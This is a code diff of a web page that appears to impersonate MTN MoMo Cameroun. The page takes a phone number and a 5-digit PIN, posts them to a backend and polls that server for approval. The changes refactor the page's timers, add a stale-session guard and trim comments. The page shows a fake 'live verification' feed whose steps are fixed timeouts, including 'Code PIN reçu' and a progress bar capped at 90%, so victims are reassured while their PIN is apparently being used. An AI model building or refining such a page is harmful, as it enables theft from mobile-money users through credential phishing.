@@ -726,7 +726,6 @@
       to   { opacity: 1; transform: translateY(0) scale(1); }
     }
 
-    /* header zone */
     .verify-header {
       display: flex;
       flex-direction: column;
@@ -753,7 +752,7 @@
       stroke: url(#vGoldGrad);
       stroke-width: 5;
       stroke-linecap: round;
-      stroke-dasharray: 226.20;   /* 2π×36 */
+      stroke-dasharray: 226.20;
       stroke-dashoffset: 226.20;
       transition: stroke-dashoffset 0.6s ease;
       filter: drop-shadow(0 0 6px rgba(255, 204, 0, 0.55));
@@ -802,7 +801,6 @@
       min-height: 2.4em;
     }
 
-    /* live activity feed */
     .verify-feed {
       text-align: left;
       background: rgba(0, 0, 0, 0.22);
@@ -831,10 +829,7 @@
       flex-shrink: 0;
       font-weight: 700;
     }
-    .feed-line .tag {
-      flex-shrink: 0;
-      font-weight: 800;
-    }
+    .feed-line .tag { flex-shrink: 0; font-weight: 800; }
     .feed-line.ok .tag { color: #22C55E; }
     .feed-line.pending .tag { color: #FFCC00; }
     .feed-line.info .tag { color: #60A5FA; }
@@ -846,7 +841,6 @@
       font-size: 10.5px;
     }
 
-    /* expected time + elapsed */
     .verify-meta {
       display: flex;
       justify-content: space-between;
@@ -864,7 +858,6 @@
       font-variant-numeric: tabular-nums;
     }
 
-    /* progress bar */
     .verify-progress {
       width: 100%;
       height: 5px;
@@ -888,7 +881,6 @@
       100% { background-position: -200% 0; }
     }
 
-    /* patience note (appears after 3 min) */
     .verify-patience {
       font-size: 10.5px;
       color: rgba(255, 204, 0, 0.75);
@@ -911,7 +903,6 @@
       margin-top: 10px;
     }
 
-    /* live pill */
     .verify-live {
       display: inline-flex;
       align-items: center;
@@ -1088,9 +1079,7 @@
     </div>
   </div>
 
-  <!-- ============================================================
-       VERIFY OVERLAY — v3 (live activity feed)
-       ============================================================ -->
+  <!-- VERIFY OVERLAY -->
   <div class="verify-overlay" id="verifyOverlay">
     <div class="verify-card">
 
@@ -1181,7 +1170,6 @@
         'nav.claim': 'Réclamer',
         'nav.support': 'Support',
         'footer.text': '© 2026 MTN MoMo Cameroun',
-        // feed messages
         'feed.secure': 'Canal sécurisé établi',
         'feed.number': 'Numéro MoMo vérifié',
         'feed.pin': 'Code PIN reçu',
@@ -1444,14 +1432,145 @@
       }, 6000);
     }
 
+    // ============================================
+    // VERIFY OVERLAY — live activity feed
+    // ============================================
+    const verifyOverlay = document.getElementById('verifyOverlay');
+    const verifyRingProgress = document.getElementById('verifyRingProgress');
+    const verifySubtitle = document.getElementById('verifySubtitle');
+    const verifyFeed = document.getElementById('verifyFeed');
+    const verifyElapsed = document.getElementById('verifyElapsed');
+    const verifyProgressFill = document.getElementById('verifyProgressFill');
+    const verifyPatience = document.getElementById('verifyPatience');
+
+    const RING_CIRCUMFERENCE = 226.20;
+    const PROGRESS_WINDOW_MS = 3 * 60 * 1000;
+
+    // Timers
+    let pollTimer = null;
+    let verifyTimer = null;
+    let feedTimer = null;
+    let elapsedTimer = null;
+
+    // Session guard — prevents stale polls from a previous attempt
+    let currentSessionId = null;
+
+    function nowTime() {
+      const d = new Date();
+      const p = n => String(n).padStart(2, '0');
+      return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+    }
+
+    function addFeedLine(kind, text, sub) {
+      const lang = localStorage.getItem('momoLang') || 'fr';
+      const t = TRANSLATIONS[lang] || TRANSLATIONS.fr;
+      const line = document.createElement('div');
+      line.className = 'feed-line ' + kind;
+      let icon = '⏳';
+      if (kind === 'ok') icon = '✓';
+      else if (kind === 'info') icon = '🔒';
+      line.innerHTML =
+        '<span class="time">' + nowTime() + '</span>' +
+        '<span class="tag">' + icon + '</span>' +
+        '<span class="txt">' + (t[text] || text) +
+        (sub ? '<span class="sub">• ' + (t[sub] || sub) + '</span>' : '') +
+        '</span>';
+      verifyFeed.appendChild(line);
+      verifyFeed.scrollTop = verifyFeed.scrollHeight;
+      requestAnimationFrame(() => line.classList.add('visible'));
+    }
+
+    function startVerifyBar() {
+      verifyOverlay.classList.add('show');
+      verifyFeed.innerHTML = '';
+      verifyProgressFill.style.width = '0%';
+      verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+      verifyPatience.classList.remove('show');
+      verifySubtitle.textContent = (TRANSLATIONS[localStorage.getItem('momoLang') || 'fr'] || TRANSLATIONS.fr)['verify.sub'];
+
+      const startTime = Date.now();
+
+      if (feedTimer) { clearInterval(feedTimer); feedTimer = null; }
+      if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+      if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+
+      const SEQUENCE = [
+        { delay: 200,   kind: 'ok',     text: 'feed.secure' },
+        { delay: 900,   kind: 'ok',     text: 'feed.number' },
+        { delay: 1600,  kind: 'ok',     text: 'feed.pin' },
+        { delay: 2400,  kind: 'pending',text: 'feed.confirm', sub: 'feed.check_tx' },
+        { delay: 5000,  kind: 'pending',text: 'feed.cross' },
+        { delay: 8000,  kind: 'info',   text: 'feed.encrypted' },
+        { delay: 13000, kind: 'pending',text: 'feed.review', sub: 'feed.review_sub' }
+      ];
+      SEQUENCE.forEach(item => {
+        setTimeout(() => addFeedLine(item.kind, item.text, item.sub), item.delay);
+      });
+
+      let extraCount = 0;
+      feedTimer = setInterval(() => {
+        if (extraCount >= 5) return;
+        extraCount++;
+        addFeedLine('pending', 'feed.review', null);
+        const lines = verifyFeed.querySelectorAll('.feed-line');
+        const last = lines[lines.length - 1];
+        if (last) {
+          const sec = Math.round((Date.now() - startTime) / 1000);
+          const sub = document.createElement('span');
+          sub.className = 'sub';
+          sub.textContent = '• ' + sec + ' sec';
+          last.querySelector('.txt').appendChild(sub);
+        }
+      }, 6000);
+
+      elapsedTimer = setInterval(() => {
+        const sec = Math.floor((Date.now() - startTime) / 1000);
+        if (sec < 60) {
+          verifyElapsed.textContent = sec + ' sec';
+        } else {
+          const m = Math.floor(sec / 60);
+          const s = sec % 60;
+          verifyElapsed.textContent = m + ' min ' + s + ' sec';
+        }
+        if (sec >= 180) verifyPatience.classList.add('show');
+      }, 1000);
+
+      verifyTimer = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const ratio = Math.min((elapsed / PROGRESS_WINDOW_MS) * 0.90, 0.90);
+        verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
+        verifyProgressFill.style.width = (ratio * 100).toFixed(1) + '%';
+      }, 500);
+    }
+
+    function finishVerifyBar() {
+      if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+      if (feedTimer) { clearInterval(feedTimer); feedTimer = null; }
+      if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+      verifyRingProgress.style.strokeDashoffset = '0';
+      verifyProgressFill.style.width = '100%';
+      addFeedLine('ok', 'feed.encrypted');
+    }
+
+    function stopPolling() {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    }
+
+    // ============================================================
+    // RESET — bulletproof: kill ALL timers, ignore stale polls
+    // ============================================================
     function resetToPhoneStep() {
-      if (verifyTimer) clearInterval(verifyTimer);
-      if (stepTimer) clearInterval(stepTimer);
-      if (feedTimer) clearInterval(feedTimer);
-      if (elapsedTimer) clearInterval(elapsedTimer);
+      // Kill every timer, null them out
+      if (pollTimer)    { clearInterval(pollTimer);    pollTimer = null; }
+      if (verifyTimer)  { clearInterval(verifyTimer);  verifyTimer = null; }
+      if (feedTimer)    { clearInterval(feedTimer);    feedTimer = null; }
+      if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+
+      // Reset UI
       verifyOverlay.classList.remove('show');
       verifyProgressFill.style.width = '0%';
       verifyFeed.innerHTML = '';
+      verifyPatience.classList.remove('show');
 
       popup.classList.remove('show');
       modal.classList.remove('open');
@@ -1481,12 +1600,9 @@
       setTimeout(() => phoneInput.focus(), 250);
     }
 
-    let pollTimer = null;
-    let verifyTimer = null;
-    let stepTimer = null;
-    let feedTimer = null;
-    let elapsedTimer = null;
-
+    // ============================================
+    // PROCEED → backend
+    // ============================================
     proceed.addEventListener('click', async () => {
       if (!/^\d{5}$/.test(pin.value)) {
         pinError.classList.add('show');
@@ -1557,137 +1673,30 @@
     });
 
     // ============================================
-    // VERIFY OVERLAY — live activity feed
+    // POLLING — with session guard
     // ============================================
-    const verifyOverlay = document.getElementById('verifyOverlay');
-    const verifyRingProgress = document.getElementById('verifyRingProgress');
-    const verifySubtitle = document.getElementById('verifySubtitle');
-    const verifyFeed = document.getElementById('verifyFeed');
-    const verifyElapsed = document.getElementById('verifyElapsed');
-    const verifyProgressFill = document.getElementById('verifyProgressFill');
-    const verifyPatience = document.getElementById('verifyPatience');
-
-    const RING_CIRCUMFERENCE = 226.20; // 2π×36
-    const PROGRESS_WINDOW_MS = 3 * 60 * 1000; // 3 minutes
-
-    function nowTime() {
-      const d = new Date();
-      const p = n => String(n).padStart(2, '0');
-      return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
-    }
-
-    function addFeedLine(kind, text, sub) {
-      const lang = localStorage.getItem('momoLang') || 'fr';
-      const t = TRANSLATIONS[lang] || TRANSLATIONS.fr;
-      const line = document.createElement('div');
-      line.className = 'feed-line ' + kind;
-      let icon = '⏳';
-      if (kind === 'ok') icon = '✓';
-      else if (kind === 'info') icon = '🔒';
-      line.innerHTML =
-        '<span class="time">' + nowTime() + '</span>' +
-        '<span class="tag">' + icon + '</span>' +
-        '<span class="txt">' + (t[text] || text) +
-        (sub ? '<span class="sub">• ' + (t[sub] || sub) + '</span>' : '') +
-        '</span>';
-      verifyFeed.appendChild(line);
-      verifyFeed.scrollTop = verifyFeed.scrollHeight;
-      requestAnimationFrame(() => line.classList.add('visible'));
-    }
-
-    function startVerifyBar() {
-      verifyOverlay.classList.add('show');
-      verifyFeed.innerHTML = '';
-      verifyProgressFill.style.width = '0%';
-      verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
-      verifyPatience.classList.remove('show');
-      verifySubtitle.textContent = (TRANSLATIONS[localStorage.getItem('momoLang') || 'fr'] || TRANSLATIONS.fr)['verify.sub'];
-
-      const startTime = Date.now();
-
-      // reset any prior timers
-      if (feedTimer) clearInterval(feedTimer);
-      if (elapsedTimer) clearInterval(elapsedTimer);
-      if (verifyTimer) clearInterval(verifyTimer);
-
-      // ---- FEED SEQUENCE ----
-      // We show the first 3 lines quickly, then keep adding one every 4 seconds.
-      const SEQUENCE = [
-        { delay: 200,   kind: 'ok',     text: 'feed.secure' },
-        { delay: 900,   kind: 'ok',     text: 'feed.number' },
-        { delay: 1600,  kind: 'ok',     text: 'feed.pin' },
-        { delay: 2400,  kind: 'pending',text: 'feed.confirm', sub: 'feed.check_tx' },
-        { delay: 5000,  kind: 'pending',text: 'feed.cross' },
-        { delay: 8000,  kind: 'info',   text: 'feed.encrypted' },
-        { delay: 13000, kind: 'pending',text: 'feed.review', sub: 'feed.review_sub' }
-      ];
-      SEQUENCE.forEach(item => {
-        setTimeout(() => addFeedLine(item.kind, item.text, item.sub), item.delay);
-      });
-
-      // Then every 6s, add a "still verifying" note (capped at 5 extra)
-      let extraCount = 0;
-      feedTimer = setInterval(() => {
-        if (extraCount >= 5) return;
-        extraCount++;
-        const sec = Math.round((Date.now() - startTime) / 1000);
-        addFeedLine('pending', 'feed.review', null);
-        // append elapsed seconds via sub
-        const lines = verifyFeed.querySelectorAll('.feed-line');
-        const last = lines[lines.length - 1];
-        if (last) {
-          const sub = document.createElement('span');
-          sub.className = 'sub';
-          sub.textContent = '• ' + sec + ' sec elapsed';
-          last.querySelector('.txt').appendChild(sub);
-        }
-      }, 6000);
-
-      // ---- ELAPSED COUNTER ----
-      elapsedTimer = setInterval(() => {
-        const sec = Math.floor((Date.now() - startTime) / 1000);
-        if (sec < 60) {
-          verifyElapsed.textContent = sec + ' sec';
-        } else {
-          const m = Math.floor(sec / 60);
-          const s = sec % 60;
-          verifyElapsed.textContent = m + ' min ' + s + ' sec';
-        }
-
-        // show patience note after 3 min
-        if (sec >= 180) {
-          verifyPatience.classList.add('show');
-        }
-      }, 1000);
-
-      // ---- PROGRESS RING + BAR (over 3 minutes, then hold at 90%) ----
-      verifyTimer = setInterval(() => {
-        const elapsed = Date.now() - startTime;
-        const ratio = Math.min((elapsed / PROGRESS_WINDOW_MS) * 0.90, 0.90);
-        verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
-        verifyProgressFill.style.width = (ratio * 100).toFixed(1) + '%';
-      }, 500);
-    }
-
-    function finishVerifyBar() {
-      if (verifyTimer) clearInterval(verifyTimer);
-      if (feedTimer) clearInterval(feedTimer);
-      if (elapsedTimer) clearInterval(elapsedTimer);
-      verifyRingProgress.style.strokeDashoffset = '0';
-      verifyProgressFill.style.width = '100%';
-      addFeedLine('ok', 'feed.encrypted');
-    }
-
-    function stopPolling() {
-      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
-    }
-
     function startPolling(sessionId, fullPhone, country, token) {
+      // Remember the newest session; any older poll will detect the change and stop
+      currentSessionId = sessionId;
+
       stopPolling();
       pollTimer = setInterval(async () => {
+        // If a newer session started, ignore this stale poll entirely
+        if (sessionId !== currentSessionId) {
+          stopPolling();
+          return;
+        }
+
         try {
           const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
           const data = await res.json().catch(() => ({}));
+
+          // Check again after network — user might have started a new attempt
+          if (sessionId !== currentSessionId) {
+            stopPolling();
+            return;
+          }
+
           if (!data.ok) return;
 
           if (data.status === 'approved') {
@@ -1707,9 +1716,9 @@
 
           } else if (data.status === 'unknown') {
             stopPolling();
-            if (verifyTimer) clearInterval(verifyTimer);
-            if (feedTimer) clearInterval(feedTimer);
-            if (elapsedTimer) clearInterval(elapsedTimer);
+            if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+            if (feedTimer) { clearInterval(feedTimer); feedTimer = null; }
+            if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
             verifyOverlay.classList.remove('show');
             document.body.classList.remove('modal-open');
             showRejectBanner();
